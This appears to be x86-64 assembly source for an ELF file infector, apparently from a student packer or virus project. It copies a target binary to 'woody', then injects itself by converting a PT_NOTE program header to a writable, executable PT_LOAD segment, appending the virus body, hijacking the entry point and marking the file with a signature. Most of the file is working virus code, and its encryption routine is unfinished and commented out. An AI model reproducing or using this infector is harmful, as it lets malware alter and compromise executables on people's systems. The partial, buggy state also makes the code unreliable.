%include "war.s"

section .text
  global _start

decryptor:
  push rdx
  push rsp

  call show_msg ; pushing db 'woody' on stack
  info_msg:
    db '....WOODY....', 0xa
    info_len equ $ - info_msg

    show_msg:
      pop rsi ; popping 'woody' in rsi
      mov rax, SYS_WRITE
      mov rdi, STDOUT
      mov rdx, info_len
      syscall

  ; age old trick 
  call .delta ; call will push the address of the next instruction on the stack
  .delta:
    pop rbp ; We pop this address into rbp
    sub rbp, .delta ; by substracting delta we get the adress of the virus at runtime

  ; mov r9, [rbp + key - _start + 1]
  ; mov r9, [rel key]
  ; address
  ; size
  
  ; mov r12, v_stop - _start ; size of stuff we wish to decrypt
  ; lea rsi, [rbp + _start]
  ; .decrypt:
  ;   ; xor byte [rsi], r9b
  ;   ror r9, 1 ; rotate key
  ;   inc rsi
  ;   dec r12
  ;   cmp r12, 0
  ;   jne .decrypt

  pop rsp
  pop rdx


_start:
  lea rax, [rsp]
  mov rax, [rax]
  cmp rax, 2 ; check ac == 2
  jne exit

  mov r13, [rsp + 0x10] ; store av[1] in r13
  mov rdi, r13
  mov rsi, O_RDONLY
  mov rax, SYS_OPEN
  syscall

  cmp rax, 0
  jl exit

  mov r8, rax ; store fd in r8

  call .open_target
  .woody:
    db "woody", 0x0

  .open_target:
    pop rdi; "woody"
    mov rsi, 578 ; O_RDWR | O_CREAT | O_TRUNC
    mov rdx, 511 ; rwxrwx--x
    mov rax, SYS_OPEN ;
    syscall ; open

    pop rdi ; pop woody

    cmp rax, 0
    jl exit

    mov r9, rax ; store fd in r9

  sub rsp, 4096
  .copy_file:
    ; read from original file (r8)
    lea rsi, [rsp]
    mov rdi, r8
    mov rdx, 4096
    mov rax, SYS_READ
    syscall

    ; write to target
    lea rsi, [rsp]
    mov rdi, r9
    mov rdx, rax
    mov rax, SYS_WRITE
    syscall

    cmp rax, 0
    jg .copy_file


  .end_copy:
    add rsp, 4096 ; restore rsp

    ; close av[1]
    mov rdi, r8
    mov rax, SYS_CLOSE
    syscall

    ; close target ("woody")
    mov rdi, r9
    mov rax, SYS_CLOSE
    syscall

  ; deactivate signals?
  sub rsp, STACK_SIZE ; enough for the stack
  sub rsp, _start - decryptor

  mov r15, rsp ; r15 will be the base of our stack

  mov dword [r15 + OFFSET], 0 ; store the offset

  ; --- Re-open woody
  call .open_target2
  .woody2:
    db "woody", 0x0

  .open_target2:
    pop rdi; "woody"

  mov rsi, O_RDWR ; 
  xor rdx, rdx ;  no flags
  mov rax, SYS_OPEN ;
  syscall ; open

  cmp rax, 0
  jl cleanup

  mov [r15 + DOT_FD], rax ; store FD for later use
  mov r9, rax

  ; -- Read Header
  mov rdi, r9 ; load fd into rdi
  lea rsi, [r15 + EHDR]; rsi = ehdr
  mov rdx, EHDR_SIZE ; give it the size we wish to read
  mov r10, 0 ; offset 0
  mov rax, SYS_PREAD64 ; scott why pread ?
  syscall

  ; -- Check header
  cmp dword [r15 + EHDR], ELF64_MAGIC ; Compare with ELF magic
  jnz .close_and_next_file ; not an ELF64, go to next one

  ; Check if it's 64 architecture
  cmp byte [r15 + EHDR_CLASS], ELFCLASS64
  jne .close_and_next_file

  ; Check if it has already been infected
  cmp dword [r15 + EHDR_PAD], SCOTT_SIGNATURE
  jz .close_and_next_file ; file has already been infected

  ; Check for endianness scott
  ; cmp byte [r15 + ehdr.ei_data], 1 ; little endian
  ; jne .close_and_next_file

  ; prepare for loop
  mov r8, [r15 + EHDR_PHOFF] ; load phoffset
  xor rbx, rbx ; initialize phdr loop counter
  xor r14, r14 ; initialize phdr file offset

  .loop_phdr:
    ; -- Read one header
    mov rdi, r9 ; load fd into rdi
    lea rsi, [r15 + PHDR_TYPE] ; rsi holds phdr
    mov dx, word [r15 + EHDR_PHENTSIZE] ; program header entry size
    mov r10, r8 ; read at ehdr.phoff from r8
    mov rax, SYS_PREAD64
    syscall

    cmp byte [r15 + PHDR_TYPE], PT_NOTE ; check if type is PT_NOTE
    je .infect ; we found, start infecting

    inc rbx ; add one to phdr loop counter

    cmp bx, word [r15 + EHDR_PHNUM] ; have we looped through all ehdr ?
    jge .close_and_next_file ; couldn't infect because no PT_NOTE found :'(

    add r8w, word [r15 + EHDR_PHENTSIZE] ; increment by ehdr_phentsize
    jmp .loop_phdr ; loop back

  .infect:
    ; Get phdr file offset
    mov ax, bx ; move the loop counter previously in bx to ax
    mov dx, word [r15 + EHDR_PHENTSIZE] ; mov phentsize to dx
    imul dx ; multiply dx by ax (phentsize * number_of_ph)
    mov r14w, ax ; store that in r14
    add r14, [r15 + EHDR_PHOFF] ; now add phoffset

    ; -- Fstat
    mov rdi, r9 ; load fd
    lea rsi, [r15 + STAT] ; stat offset on stack
    mov rax, SYS_FSTAT
    syscall

    cmp rax, 0
    jnz .close_and_next_file ; if fstat failed, go to next file

    ; -- Append Virus
    mov rdi, r9 ; load fd
    mov rsi, 0 ; seek offset 0
    mov rdx, SEEK_END ; go to the end of the file
    mov rax, SYS_LSEEK
    syscall

    cmp rax, 0
    jl .close_and_next_file ; if error go to next file

    call .delta ; call will push the address of the next instruction on the stack
    .delta:
      pop rbp ; We pop this address into rbp
      sub rbp, .delta ; by substracting delta we get the adress of the virus at runtime

    push rax ; store target EOF
    push r9 ; store fd on the stack

    ; generate key
    ; open /dev/urandom
    call .after_urandom
    .urandom:
      db '/dev/urandom', 0x0
    .after_urandom:
      pop rdi

    xor r9, r9
    mov r9d, [r15 + OFFSET] ; load the offset we need to add
    mov rsi, O_RDONLY
    mov rax, SYS_OPEN
    syscall

    cmp rax, 0
    jge .generate_key
    pop r9
    pop rax
    jmp .close_and_next_file

    .generate_key:
      mov rdi, rax ; load fd
      lea rsi, [r15 + KEY] ; load key address
      mov rdx, 8 ; size
      mov rax, SYS_READ
      syscall

    cmp rax, 0
    jge .load_key
    pop r9
    pop rax
    jmp .close_and_next_file

    .load_key:
      mov r9, [r15 + KEY]
      mov r9, 0x4242424242424242

    ; copy decryptor on the stack
    mov r12, _start - decryptor ; size to copy
    xor rax, rax
    mov eax, [r15 + OFFSET] ; load the offset we need to add
    lea rsi, [rbp + decryptor + rax] 
    lea rax, [r15 + STACK_SIZE]
    xor rdi, rdi ; init rdi
    .memcpy_decryptor:
      mov dil, byte [rsi]
      mov byte[rax], dil
      inc rsi
      inc rax
      dec r12
      cmp r12, 0
      jg .memcpy_decryptor

    ; should be section here
    mov r12, v_stop - _start ; size to copy
    xor rax, rax
    mov eax, [r15 + OFFSET]
    lea rsi, [rbp + _start + rax] 
    lea rax, [r15 + STACK_SIZE + _start - decryptor] ; only encrypt from _start
    xor rdi, rdi
    .memcpy_and_encrypt:
      mov dil, byte [rsi]
      ; xor dil, r9b
      ror r9, 1 ; rotate key
      mov byte [rax], dil
      inc rsi
      inc rax
      dec r12
      cmp r12, 0
      jg .memcpy_and_encrypt

    pop r9 ; restore fd in r9

    ; write virus body to the end of the file
    mov rdi, r9 ; load fd
    lea rsi, [r15 + STACK_SIZE]
    mov rdx, _start - decryptor; virus size
    pop r10; load target EOF into r10
    mov rax, SYS_PWRITE64
    syscall

    cmp rax, 0
    jge .patch_phdr
    pop rax
    jmp .close_and_next_file

    .patch_phdr:
    ; -- Patch program header
    mov dword [r15 + PHDR_TYPE], PT_LOAD ; change PT_NOTE to PT_LOAD
    mov dword [r15 + PHDR_FLAGS], PF_R | PF_X | PF_W ; Add rwx rights to flags
    mov rax, r10 ; restore target EOF into rax

    mov [r15 + PHDR_OFFSET], rax ; put target EOF into phdr_offset
    mov r13, [r15 + ST_SIZE] ; loading st_size in r13
    add r13, VADDR ; adding VADDR to target file size. Big address to not interfere with program.
    mov [r15 + PHDR_VADDR], r13 ; change vaddr to (stat.st_size + VADDR)

    mov qword [r15 + PHDR_ALIGN], ALIGN ; make sure alignment is correct ; SCOTT check
    add qword [r15 + PHDR_FILESZ], _start - decryptor + JMP_REL_SIZE ; + signature_len + fingerprint_len ; adjust filesize. Add + 5 because of jmp instruction
    add qword [r15 + PHDR_MEMSZ], _start - decryptor + JMP_REL_SIZE; + signature_len + fingerprint_len ; adjust memsize. Add + 5 because of jmp instruction.

    ; -- Write the patched header
    ; pwrite(fd, buf, count, offset)
    mov rdi, r9 ; load fd 
    lea rsi, [r15 + PHDR_TYPE] ; load the phdr in rsi, buf
    mov dx, word [r15 + EHDR_PHENTSIZE] ; count (size of a ph entry)
    mov r10, r14 ; phdr offset
    mov rax, SYS_PWRITE64
    syscall

    cmp rax, 0
    jle .close_and_next_file

    ; -- Patch ehdr
    mov r14, [r15 + EHDR_ENTRY] ; store original ehdr entry in r14
    mov [r15 + EHDR_ENTRY], r13 ; set entry to phdr.vaddr (VADDR)
    mov r13d, SCOTT_SIGNATURE ; load signature
    mov dword [r15 + EHDR_PAD], r13d ; add signature


    ; Write the patched ehdr
    mov rdi, r9 ; load fd
    lea rsi, [r15 + EHDR] ; ehdr offset in stack
    mov rdx, EHDR_SIZE ; size of ehdr we wish to write
    mov r10, 0 ; offset is 0
    mov rax, SYS_PWRITE64
    syscall

    cmp rax, 0
    jl .close_and_next_file

    ; -- Get to the end of the file
    mov rdi, r9 ; load fd
    xor rsi, rsi ; offset 0
    mov rdx, SEEK_END ; end of the file
    mov rax, SYS_LSEEK
    syscall

    cmp rax, 0
    jl .close_and_next_file ; if error go to next file

    ; Create patched jmp
    mov rdx, [r15 + PHDR_VADDR] ; load the virtual address
    add rdx, JMP_REL_SIZE ; add size of jmp rel instruction
    sub r14, rdx ; scott
    sub r14, _start - decryptor ; scott
    mov byte [r15 + JMP_REL], 0xe9 ; jmp instruction
    mov dword [r15 + JMP_REL + 1], r14d ; scott why

    ; Write patched jmp to EOF
    mov rdi, r9 ; load fd
    lea rsi, [r15 + JMP_REL] ; rsi = patched jmp in stack buffer
    mov r10, rax ; load EOF
    mov rdx, JMP_REL_SIZE ; size of jmp rel
    mov rax, SYS_PWRITE64
    syscall

    cmp rax, 0
    jl .close_and_next_file ; if error continue

    ; -- Get to the end of the file
    mov rdi, r9 ; load fd
    xor rsi, rsi ; offset 0
    mov rdx, SEEK_END ; end of the file
    mov rax, SYS_LSEEK
    syscall

    ; Write key
    lea rsi, [r15 + KEY] ; load address
    mov r10, rax ; load EOF in rax
    mov rdx, 8 ; want to write 8 bytes
    mov rax, SYS_PWRITE64
    syscall

    cmp rax, 0
    jl .close_and_next_file ; if error go to next file
  
  ; .find_text_section:
  ; .encrypt_text_section:
  ; .append_decryption_stub:

    mov rax, SYS_SYNC ; committing filesystem caches to disk
    syscall

  .close_and_next_file:
    mov rdi, r9 ; load fd from r9
    mov rax, SYS_CLOSE
    syscall

  .next_file:

cleanup:
  ; restore signals ?
  add rsp, STACK_SIZE ; restore rsp
  add rsp, v_stop - decryptor;

v_stop:
  jmp exit
key:
  db 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90

exit:
  xor rdi, rdi ; exit code 0
  mov rax, SYS_EXIT;
  syscall